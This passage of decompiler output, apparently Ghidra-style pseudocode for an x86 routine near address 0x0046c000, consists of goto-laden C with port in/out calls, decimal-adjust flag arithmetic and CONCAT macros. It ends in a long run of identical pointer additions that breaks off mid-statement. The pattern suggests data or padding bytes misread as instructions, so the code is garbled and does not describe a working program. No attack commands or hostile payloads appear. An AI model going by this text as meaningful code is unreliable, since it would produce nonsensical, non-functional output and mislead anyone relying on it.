0x74734044;\n                                    uVar57 = uVar57 & 0xffffffff00000000 | uVar18;\n                                    pcVar44 = pcVar44 + 2;\n                                    in_stack_0000002a = uVar18;\n                                    in_stack_0000002c = uVar18 >> 0x10;\n                                    in_stack_0000002d = uVar18 >> 0x18;\n                                    goto code_r0x0046c2f1;\n                                }\njoined_r0x0046c33a:\n                                if (!uVar53) {\n                                    uVar31 = uVar4 >> 0x20;\n                                    puVar47 = uVar4 + 1;\n                                    out(*uVar4, uVar4 >> 0x20);\n                                    goto code_r0x0046c333;\n                                }\n                                pcVar44 = uVar6 + (in_stack_ffffffc8 + 0x11) * 4;\n                                *pcVar44 = *pcVar44 + (uVar6 >> 0x20);\n                                piVar51 = piVar33;\n                                goto code_r0x0046c3b6;\n                            }\n                            in_stack_0000002e = in_stack_0000002e + '.';\n                            *piVar52 = *piVar52 + (puVar27 >> 8);\n                            in_AF = in_AF | 1;\n                            puVar58 = *0x10 & 0xffff0000 |\n                                      CONCAT11((&stack0x0000002e >> 8) - in_AF, in_AF * -6 + '.') & 0xff0f;\n                            goto code_r0x0046c342;\n                        }\n                        if (bVar54) {\n                            pcVar21 = pcVar21 + 1;\n                            puVar47 = puVar5;\n                            goto code_r0x0046c2a8;\n                        }\n                        *pcVar21 = *pcVar21 + in_stack_0000000d;\n                        *puVar5 = *puVar5 + in_stack_0000000a;\n                        in_AF = 9 < (in_stack_0000000d & 0xf) | in_AF;\n                        pcVar44 = (pcVar21 & 0xffff0000 |\n                                  CONCAT11(in_stack_0000000e - in_AF, in_stack_0000000d + in_AF * -6) & 0xff0f) + 2;\n                        *(puVar5 + puVar27 + 0x11) = *(puVar5 + puVar27 + 0x11) + arg_8h._1_2_;\n                        uVar53 = pcVar44;\n                        *pcVar44 = *pcVar44 + uVar53;\n                        in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                        uVar25 = CONCAT11((pcVar44 >> 8) - in_AF, uVar53 + in_AF * -6) & 0xff0f;\n                        puVar27 = puVar27 + 1;\n                        in_stack_0000000d = uVar18 >> 8;\n                        in_stack_0000000e = uVar18 >> 0x10;\n                        in_stack_0000000f = uVar18 >> 0x18;\n                        in_stack_00000010 = var_4h;\n                        uVar10 = uVar25;\n                        in_AF = 9 < uVar10 | in_AF;\n                        uVar10 = uVar10 + in_AF * -6;\n                        uVar53 = false;\n                        pcVar21 = pcVar44 & 0xffff0000 | (CONCAT11((uVar25 >> 8) - in_AF, uVar10) & 0xff0f) & 0xffffff6e\n                        ;\n                        if ((uVar10 & 0xe) != 0) goto code_r0x0046c386;\n                        puVar47 = puVar5 + 1;\n                        out(*puVar5, arg_8h._1_2_);\ncode_r0x0046c31c:\n                        uVar6 = CONCAT44(uVar31, unaff_ESI);\n                        puVar15 = pcVar21 * 3 + 0x44;\n                        *puVar15 = *puVar15 + uVar53 * ((puVar47 & 3) - (*puVar15 & 3));\n                        piVar45 = pcVar21 + 1;\n                        piStackY64 = piVar34;\n                        puStackY72 = puVar43;\n                        if (uVar53) {\ncode_r0x0046c323:\n                            pcVar44 = piVar45 + 2;\n                            *pcVar44 = *pcVar44 + pcVar44;\n                            in_stack_00000011 = in_stack_00000011 + '\\x11';\n                            *puVar47 = *puVar47 + (puVar27 >> 8);\n                            puVar58 = *0x10 & 0xffff0000 |\n                                      CONCAT11((&stack0x00000011 >> 8) - in_AF, in_AF * -6 + '\\x11') & 0xff0f;\n                            in_stack_ffffffc8 = puVar27 + 1;\n                            goto code_r0x0046c333;\n                        }\n                        in_stack_00000009 = puVar47;\n                        in_stack_0000000a = puVar47 >> 8;\n                        in_stack_0000000b = puVar47 >> 0x10;\n                        in_stack_0000000c = puVar47 >> 0x18;\n                        piVar33 = puVar47 + 1;\n                        out(*puVar47, uVar31);\n                        puVar15 = puVar27 + 0x6d;\n                        *puVar15 = *puVar15 + uVar53 * ((puVar43 & 3) - (*puVar15 & 3));\n                        in_stack_ffffffc8 = puVar27;\n                        if (SBORROW4(&stack0x0000000d, 1)) goto code_r0x0046c3e0;\n                        piVar52 = puVar47 + 1;\n                        uVar1 = in(uVar31);\n                        *puVar47 = uVar1;\ncode_r0x0046c3a1:\n                        uVar57 = CONCAT44(uVar12, unaff_ESI);\n                        piVar51 = piVar33 + 1;\n                        uVar6 = CONCAT44(uVar31, piVar51);\n                        out(*piVar33, uVar31);\n                        puVar26 = in_stack_ffffffc8 + 0x1b;\n                        *puVar26 = *puVar26 + uVar53 * -(*puVar26 & 3);\n                        bVar54 = piVar45 != 0xffffffff;\n                        if (uVar53) {\n                            pcVar44 = piVar45 + 3;\n                            *pcVar44 = *pcVar44 + pcVar44;\n                            *pcVar44 = *pcVar44 + pcVar44;\n                            *piVar51 = *piVar51 + (in_stack_ffffffc8 >> 8);\n                            piVar45 = &stack0xffffff00 & 0xffff0000 |\n                                      CONCAT11((&stack0xffffffd0 >> 8) - in_AF, in_AF * -6) & 0xff0f;\n                            arg_8h = piVar34;\n                            uVar53 = in_AF;\n                            goto code_r0x0046c3ba;\n                        }\n                        iVar2 = CONCAT11(cVar8, uVar59);\n                        puVar43 = CONCAT13(uVar63, CONCAT21(uVar29, uVar62));\n                        in_stack_ffffffc8 = NULL;\n                        piVar45 = 0xea60;\n                        if (bVar54) {\n                            puVar58 = segment(in_DS, iVar2);\n                            piVar13 = CONCAT13(uVar61, CONCAT12(uVar60, iVar2)) & 0xffff0000 | iVar2 + 4;\n                            out(*puVar58, uVar12);\n                            goto code_r0x0046c422;\n                        }\ncode_r0x0046c48c:\n                        uVar53 = in_AF;\n                        *piStack20 = *piStack20 - &stack0xfffffff0;\n                        *puStack24 = *puStack24 ^ piVar13;\n                        piVar45 = piStack20 + -0x34303032;\ncode_r0x0046c497:\n                        puVar14 = (uVar57 >> 0x20) + 0x79;\n                        *puVar14 = *puVar14 & piVar45 >> 8;\n                        *(piVar45 + 0x2e) = *(piVar45 + 0x2e) & uVar57 >> 0x20;\n                        piVar13 = piVar45;\n                        in_AF = uVar53;\ncode_r0x0046c49d:\n                        piVar52 = uVar57;\n                        cVar8 = uVar57 >> 0x20;\ncode_r0x0046c49e:\n                        piVar13 = piVar13 + 0x1b;\n                        uVar53 = 0;\n                        *piVar13 = *piVar13 & cVar8 - 1U;\n                        bVar54 = *piVar13 == '\\0';\n                        puVar43 = CONCAT13(var_4h._3_1_, CONCAT12(var_4h._2_1_, CONCAT11(var_4h._1_1_, var_4h)));\n                        piVar34 = CONCAT13(unaff_retaddr_01, CONCAT21(unaff_retaddr_00, unaff_retaddr));\n                        uVar6 = CONCAT44(CONCAT13(arg_8h._3_1_, CONCAT21(arg_8h._1_2_, arg_8h._0_1_)), var_8h);\n                        in_stack_ffffffc8 =\n                             CONCAT13(in_stack_0000000b, \n                                      CONCAT12(in_stack_0000000a, CONCAT11(in_stack_00000009, in_stack_00000008)));\n                        piVar19 = CONCAT13(in_stack_0000000f, \n                                           CONCAT12(in_stack_0000000e, CONCAT11(in_stack_0000000d, in_stack_0000000c)));\ncode_r0x0046c4a3:\n                        if (bVar54) {\ncode_r0x0046c4a5:\n                            pcVar44 = uVar6 >> 0x20;\n                            if (uVar53) goto code_r0x0046c4d4;\n                            puVar14 = in_stack_ffffffc8 + puVar43 * 2 + 99;\n                            *puVar14 = *puVar14 & in_stack_ffffffc8 >> 8;\n                            piVar13 = uVar6 + 1;\n                            out(*uVar6, uVar6 >> 0x20);\n                            piVar45 = piVar19;\n                            goto code_r0x0046c515;\n                        }\n                        cVar8 = piVar19;\n                        *piVar19 = *piVar19 + cVar8;\n                        *piVar19 = *piVar19 + cVar8;\n                        *(uVar6 + piVar19 * 2) = 0;\n                        *(uVar6 + piVar19 * 2 + 0x10100) = 0;\n                        *piVar19 = *piVar19 + cVar8;\n                        *piVar19 = *piVar19 + cVar8;\n                    }\n                    else {\n                        *piVar45 = *piVar45 + cVar7;\n                        in_AF = 9 < uVar53 | in_AF;\n                        piVar19 = puVar14 & 0xffff0000 | CONCAT11((uVar25 >> 8) - in_AF, uVar53 + in_AF * -6) & 0xff0f;\ncode_r0x0046c090:\n                        in_AF = 9 < (piVar19 & 0xf) | in_AF;\n                        uVar25 = CONCAT11((piVar19 >> 8) - in_AF, piVar19 + in_AF * -6) & 0xff0f;\n                        puVar26 = puVar26 + 1;\n                        arg_8h._3_1_ = uVar57;\n                        in_stack_00000008 = uVar57 >> 8;\n                        in_stack_00000009 = uVar57 >> 0x10;\n                        in_stack_0000000a = uVar57 >> 0x18;\n                        uVar10 = uVar25;\n                        in_AF = 9 < uVar10 | in_AF;\n                        uVar53 = 0;\n                        piVar19 = piVar19 & 0xffff0000 |\n                                  (CONCAT11((uVar25 >> 8) - in_AF, uVar10 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                        piVar34 = piVar33;\n                        uVar4 = uVar57;\ncode_r0x0046c097:\n                        piVar52 = uVar4 >> 0x20;\n                        puVar47 = uVar4;\n                        piVar45 = puVar47 + 1;\n                        out(*puVar47, uVar4 >> 0x20);\n                        puVar15 = puVar47 + in_GS_OFFSET + 0x78;\n                        *puVar15 = *puVar15 + uVar53 * ((piVar45 & 3) - (*puVar15 & 3));\n                        puVar14 = piVar19 + 1;\ncode_r0x0046c09f:\n                        if (uVar53) {\n                            puVar14 = puVar14 + 2;\n                            *(piVar45 + puVar26 + 0x11) = *(piVar45 + puVar26 + 0x11) + piVar52;\n                            uVar10 = puVar14;\n                            *puVar14 = *puVar14 + uVar10;\n                            uVar53 = 9 < (uVar10 & 0xf) | in_AF;\n                            puVar16 = puVar14 & 0xffff0000 |\n                                      CONCAT11((puVar14 >> 8) - uVar53, uVar10 + uVar53 * -6) & 0xff0f;\n                            puVar27 = puVar26 + 1;\n                            arg_8h._1_2_ = SUB42(piVar45, 0);\n                            arg_8h._3_1_ = piVar45 >> 0x10;\n                            in_stack_00000008 = piVar45 >> 0x18;\n                            puVar26 = puVar26 + 0x1d;\n                            iVar2 = (*0x10 + 9U & 3) - (*puVar26 & 3);\n                            bVar54 = 0 < iVar2;\n                            *puVar26 = *puVar26 + uVar53 * iVar2;\n                            piVar51 = piVar45;\n                            in_AF = uVar53;\ncode_r0x0046c0bb:\n                            uVar57 = CONCAT44(piVar52, piVar45);\n                            puVar42 = puVar39;\n                            if (!bVar54) goto code_r0x0046c0bd;\ncode_r0x0046c0fd:\n                            uVar53 = puVar16;\n                            *puVar16 = *puVar16 + uVar53;\n                            *(piVar45 + puVar27 + 0x11) = *(piVar45 + puVar27 + 0x11) + piVar52;\n                            *puVar16 = *puVar16 + uVar53;\n                            in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                            in_AF = 9 < (uVar53 + in_AF * -6 & 0xf) | in_AF;\n                            piVar45 = CONCAT13(in_stack_0000000c, \n                                               CONCAT12(in_stack_0000000b, \n                                                        CONCAT11(in_stack_0000000a, in_stack_00000009)));\n                            piVar52 = CONCAT13(in_stack_0000001c, CONCAT21(in_stack_0000001a, in_stack_00000019));\n                            puVar27 = CONCAT13(in_stack_00000020, CONCAT21(in_stack_0000001e, in_stack_0000001d));\n                            puVar14 = CONCAT13(in_stack_00000024, CONCAT21(in_stack_00000022, in_stack_00000021));\n                            *puVar14 = *puVar14 + in_stack_00000021;\n                            *puVar14 = *puVar14 + in_stack_00000021;\n                        }\n                        else {\n                            puVar27 = puVar26;\n                            if (!uVar53) {\n                                puVar47 = CONCAT13(in_stack_0000000c, \n                                                   CONCAT12(in_stack_0000000b, \n                                                            CONCAT11(in_stack_0000000a, in_stack_00000009)));\n                                puVar42 = CONCAT13(in_stack_00000014, CONCAT21(in_stack_00000012, in_stack_00000011));\n                                piVar34 = CONCAT13(in_stack_0000001c, CONCAT21(in_stack_0000001a, in_stack_00000019));\n                                puVar27 = CONCAT13(in_stack_00000024, CONCAT21(in_stack_00000022, in_stack_00000021));\n                                piVar51 = puVar47 + 1;\n                                uVar31 = in(CONCAT21(in_stack_0000001e, in_stack_0000001d));\n                                *puVar47 = uVar31;\n                                uVar18 = CONCAT13(in_stack_00000028, CONCAT21(in_stack_00000026, in_stack_00000025)) + 1\n                                ;\n                                in_stack_00000026 = CONCAT21(in_stack_00000012, in_stack_00000011);\n                                in_stack_00000028 = in_stack_00000012 >> 8;\n                                in_stack_00000029 = in_stack_00000014;\n                                in_AF = 9 < (uVar18 & 0xf) | in_AF;\n                                in_stack_00000011 = 'a';\n                                in_stack_00000012 = 0x5f72;\n                                in_stack_00000014 = 0x74;\n                                uVar4 = *(piVar34 +\n                                         CONCAT13(in_stack_00000010, \n                                                  CONCAT12(in_stack_0000000f, \n                                                           CONCAT11(in_stack_0000000e, in_stack_0000000d))) * 2 + 0x40)\n                                        * 0x74734044;\n                                uVar57 = uVar4 & 0xffffffff |\n                                         CONCAT13(in_stack_00000020, CONCAT21(in_stack_0000001e, in_stack_0000001d)) <<\n                                         0x20;\n                                uVar53 = uVar4 != uVar4;\n                                puVar16 = (uVar18 & 0xffff0000 |\n                                          (CONCAT11((uVar18 >> 8) - in_AF, uVar18 + in_AF * -6) & 0xff0f) & 0xffffff63)\n                                          + 1;\n                                goto code_r0x0046c133;\n                            }\n                        }\n                        uVar57 = CONCAT44(piVar52, piVar45);\n                        *piVar45 = *piVar45 + (puVar27 >> 8);\n                        in_AF = 9 < (puVar14 & 0xf) | in_AF;\n                        puVar16 = puVar14 & 0xffff0000 | CONCAT11((puVar14 >> 8) - in_AF, puVar14 + in_AF * -6) & 0xff0f\n                        ;\ncode_r0x0046c172:\n                        piVar33 = uVar57;\n                        puVar16 = puVar16 + 1;\n                        uVar53 = puVar16;\n                        *puVar16 = *puVar16 + uVar53;\n                        *(piVar33 + puVar27 + 0x11) = *(piVar33 + puVar27 + 0x11) + (uVar57 >> 0x20);\n                        *puVar16 = *puVar16 + uVar53;\n                        in_AF = 9 < (uVar53 & 0xf) | in_AF;\n                        arg_8h._1_2_ = uVar57;\n                        arg_8h._3_1_ = uVar57 >> 0x10;\n                        in_stack_00000008 = uVar57 >> 0x18;\n                        in_AF = 9 < (uVar53 + in_AF * -6 & 0xf) | in_AF;\n                        puVar26 = CONCAT13(in_stack_00000010, \n                                           CONCAT12(in_stack_0000000f, CONCAT11(in_stack_0000000e, in_stack_0000000d)));\n                        piVar34 = CONCAT13(in_stack_00000018, CONCAT21(in_stack_00000016, in_stack_00000015));\n                        uVar57 = CONCAT44(CONCAT13(in_stack_0000001c, CONCAT21(in_stack_0000001a, in_stack_00000019)), \n                                          CONCAT13(in_stack_0000000c, \n                                                   CONCAT12(in_stack_0000000b, \n                                                            CONCAT11(in_stack_0000000a, in_stack_00000009))));\n                        puVar27 = CONCAT13(in_stack_00000020, CONCAT21(in_stack_0000001e, in_stack_0000001d));\n                        uVar18 = CONCAT13(in_stack_00000024, CONCAT21(in_stack_00000022, in_stack_00000021));\ncode_r0x0046c1f3:\n                        puVar58 = uVar57;\n                        uVar29 = uVar57 >> 0x20;\n                        out(*puVar58, uVar29);\n                        *(puVar27 + 0x1d) = *(puVar27 + 0x1d);\n                        uVar57 = uVar57 & 0xffffffff00000000 | ZEXT48(puVar58 + 2);\n                        out(puVar58[1], uVar29);\n                        pcVar44 = (uVar18 + 1 & 0xffffff00 | uVar18 + 1 ^ *(uVar18 + 0x41)) + 1;\ncode_r0x0046c276:\n                        in_stack_0000000e = uVar57;\n                        in_stack_0000000f = uVar57 >> 8;\n                        in_stack_00000010 = uVar57 >> 0x10;\n                        in_stack_00000011 = uVar57 >> 0x18;\n                        in_AF = 9 < (pcVar44 & 0xf) | in_AF;\n                        pcVar44 = pcVar44 & 0xffff0000 | CONCAT11((pcVar44 >> 8) - in_AF, pcVar44 + in_AF * -6) & 0xff0f\n                        ;\n                        in_stack_ffffffc8 = puVar27;\ncode_r0x0046c2f1:\n                        uVar31 = uVar57 >> 0x20;\n                        puVar58 = uVar57;\n                        in_AF = 9 < (pcVar44 & 0xf) | in_AF;\n                        uVar18 = pcVar44 & 0xffff0000 |\n                                 (CONCAT11((pcVar44 >> 8) - in_AF, pcVar44) & 0xff0f) & 0xffffff61;\n                        uVar29 = uVar57 >> 0x20;\n                        uVar53 = in(uVar29);\n                        *piVar33 = uVar53;\n                        puVar16 = piVar33 + 2;\n                        uVar53 = in(uVar29);\n                        *(piVar33 + 1) = uVar53;\n                        out(*puVar58, uVar29);\n                        *(in_stack_ffffffc8 + 0x1d) = *(in_stack_ffffffc8 + 0x1d);\n                        piVar13 = puVar58 + 2;\n                        out(puVar58[1], uVar29);\n                        uVar22 = uVar18 + 1;\n                        uVar53 = false;\n                        piVar19 = uVar22 & 0xffffff00 | uVar22 ^ *(uVar18 + 0x41);\n                        piStackY64 = piVar34;\n                        puStackY72 = puVar26;\ncode_r0x0046c378:\n                        uVar6 = CONCAT44(uVar31, unaff_ESI);\n                        piVar33 = piVar13 + 1;\n                        out(*piVar13, uVar31);\n                        piVar51 = puVar16 & 0xffff0000 | CONCAT11(in_stack_0000002d, in_stack_0000002c);\n                        piVar34 = piStackY64;\n                        puVar43 = puStackY72;\n                        piVar52 = piVar33;\n                        if (!uVar53) goto code_r0x0046c37d;\ncode_r0x0046c3de:\n                        in_stack_0000000c = piVar33;\n                        in_stack_0000000d = piVar33 >> 8;\n                        in_stack_0000000e = piVar33 >> 0x10;\n                        in_stack_0000000f = piVar33 >> 0x18;\n                        piVar45 = piVar19;\n                        in_stack_ffffffc8 = in_stack_ffffffc8 + 1;\ncode_r0x0046c3e0:\n                        iVar46 = CONCAT13(in_stack_0000000f, \n                                          CONCAT12(in_stack_0000000e, CONCAT11(in_stack_0000000d, in_stack_0000000c)));\n                        piVar52 = iVar46 + 1;\n                        piVar51 = piVar33 + 1;\n                        uVar29 = uVar6 >> 0x20;\n                        out(*piVar33, uVar29);\n                        piVar19 = piVar45;\n                        if (!uVar53) {\n                            puVar15 = iVar46 + 0x66;\n                            *puVar15 = *puVar15 + uVar53 * ((piVar34 & 3) - (*puVar15 & 3));\n                            if (uVar53) {\n                                *(piVar45 + in_stack_ffffffc8 + -0x1ddeffef) =\n                                     *(piVar45 + in_stack_ffffffc8 + -0x1ddeffef) + (uVar6 >> 0x20);\n                                *(piVar45 + 0x18001122) = *(piVar45 + 0x18001122) + (piVar34 >> 8);\n                                arg_8h = piVar34;\n                            }\n                            else {\n                                piVar13 = piVar33 + 5;\n                                out(*piVar51, uVar29);\n                                uVar57 = uVar6;\ncode_r0x0046c3ed:\n                                if (uVar53) goto code_r0x0046c44e;\n                                puVar26 = in_stack_ffffffc8 + 0x1d;\n                                *puVar26 = *puVar26 + uVar53 * -(*puVar26 & 3);\n                                puVar58 = segment(in_GS, piVar13);\n                                piVar13 = piVar13 & 0xffff0000 | piVar13 + 4;\n                                out(*puVar58, uVar57 >> 0x20);\n                                piVar33 = piVar19;\n                                uVar6 = uVar57;\n                                if (!uVar53) goto code_r0x0046c3f7;\n                                piVar51 = piVar13 + 1;\n                                piVar45 = piVar19 & 0xffffff00 | *piVar13;\n                                arg_8h = piVar34;\n                            }\ncode_r0x0046c46d:\n                            pcVar44 = uVar6 >> 0x20;\n                            cVar8 = piVar45;\n                            *(piVar45 * 2 + -0x54) = cVar8;\n                            *(piVar45 * 2 + 1) = cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            *pcVar44 = *pcVar44 + in_stack_ffffffc8;\n                            *piVar45 = *piVar45 + cVar8;\n                            goto code_r0x0046c47b;\n                        }\n                        uVar53 = in_AF;\n                        uVar4 = uVar6 & 0xffffffff00000000 | ZEXT48(piVar51);\n                        if (piVar52 != NULL) {\n                            piVar19 = piVar45 + 1;\ncode_r0x0046c451:\n                            piVar45 = piVar19 + 2;\n                            cVar8 = piVar45;\n                            *piVar45 = *piVar45 + cVar8;\n                            *piVar45 = *piVar45 + cVar8;\n                            uVar53 = in(uVar6 >> 0x20);\n                            *piVar52 = uVar53;\n                            *(piVar19 + 0x62 + piVar45) = cVar8;\n                            *(piVar19 + -0x6a + piVar45) = cVar8;\n                            *(piVar19 + -0x7a + piVar45) = cVar8;\n                            *(piVar19 + -0x46 + piVar45) = cVar8;\n                            *(piVar19 + 0x62 + piVar45) = cVar8;\n                            arg_8h = piVar34;\n                            piVar52 = piVar52 + 1;\n                            goto code_r0x0046c46d;\n                        }\ncode_r0x0046c4b6:\n                        iVar3 = *(uVar4 + 0x6b) * 0x61776d75;\n                        puVar43 = iVar3;\n                        bVar54 = puVar43 != iVar3;\n                        uVar6 = uVar4;\ncode_r0x0046c4bd:\n                        in_AF = uVar53;\n                        if (!bVar54) {\n                            piVar19 = piVar19 & 0xffffff00 | piVar19 - 0x20;\n                            if (*0x10 == 0xfffffff0) goto code_r0x0046c528;\n                            goto code_r0x0046c4c4;\n                        }\n                    }\n                    *piVar19 = *piVar19 + piVar19;\n                    *piVar19 = *piVar19 + piVar19;\ncode_r0x0046c528:\n                    *piVar19 = *piVar19 + (uVar6 >> 0x20);\n                    cVar8 = piVar19;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    *piVar19 = *piVar19 + cVar8;\n                    uVar53 = cVar8 + *piVar19;\n                    uVar18 = piVar19 & 0xffffff00;\n                    ppcVar17 = uVar18 | uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + ppcVar17;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    *ppcVar17 = *ppcVar17 + uVar53;\n                    uVar53 = uVar53 + *ppcVar17;\n                    pcVar44 = uVar18 | uVar53;\n                    *pcVar44 = *pcVar44 + uVar53;\n                    uVar53 = uVar53 + *pcVar44;\n                    piVar45 = uVar18 | uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = *piVar45 + uVar53;\n                    *piVar45 = 